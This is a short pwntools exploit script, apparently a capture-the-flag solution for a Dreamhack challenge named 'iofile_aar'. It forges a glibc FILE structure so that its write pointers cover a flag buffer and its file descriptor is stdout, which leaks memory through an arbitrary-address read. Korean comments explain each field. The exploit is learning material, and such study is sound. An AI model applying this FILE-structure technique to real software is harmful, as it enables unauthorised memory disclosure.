#!/usr/bin/env python3
# Name: iofile_aar.py

from pwn import *
# p = process('./iofile_aar')
p = remote('host3.dreamhack.games','24230')

elf = ELF('./iofile_aar')
flag_buf = elf.symbols['flag_buf']  # flag 데이터가 담긴 변수
payload = p64(0xfbad0000 | 0x800)  # 파일 구조체 _flag 변수 설정 (magic number + _IO_CURRENTLY_PUTTING)
payload += p64(0) # _IO_read_ptr, 미사용
payload += p64(flag_buf) # _IO_read_end, 미사용
payload += p64(0) # _IO_read_base, 미사용
payload += p64(flag_buf) # _IO_write_base, flag 데이터가 담긴 변수의 주소
payload += p64(flag_buf + 1024) # _IO_write_ptr, flag 데이터가 담긴 변수의 주소 + 크기
payload += p64(0) # _IO_write_end, 미사용
payload += p64(0) # _IO_buf_base, 미사용
payload += p64(0) # _IO_buf_end, 미사용
payload += p64(0) # _IO_save_base, 미사용
payload += p64(0) # _IO_backup_base, 미사용
payload += p64(0) # _IO_save_end, 미사용
payload += p64(0) # struct _IO_marker, 미사용
payload += p64(0) # struct _IO_FILE, 미사용
payload += p64(1) # _fileno,  파일 디스크립터 값을 stdout 로 설정
p.sendlineafter(b'Data: ', payload)
p.interactive()
